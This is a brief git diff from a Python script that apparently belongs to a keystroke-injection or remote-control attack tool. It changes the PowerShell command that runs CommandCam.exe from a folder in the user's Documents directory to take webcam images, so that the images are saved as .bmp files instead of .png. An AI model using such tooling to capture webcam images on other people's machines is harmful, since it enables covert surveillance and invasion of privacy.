@@ -328,9 +328,9 @@ while not stop:
             options = [x for x in ducky_command.split(" ")[1:] if x]
             commands = []
             if len(options) > 0:
-                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/webcam.png\" /devnum " + options[0])
+                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/webcam.bmp\" /devnum " + options[0])
             else:
-                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/webcam.png\"")
+                commands.append("& \"$env:userprofile/Documents/z/CommandCam.exe\" /filename \"$env:userprofile/Documents/z/webcam.bmp\"")
             stdin = "; ".join(commands)
         else:
             print("Ducky command not recognized: \"" + ducky_command + "\"")
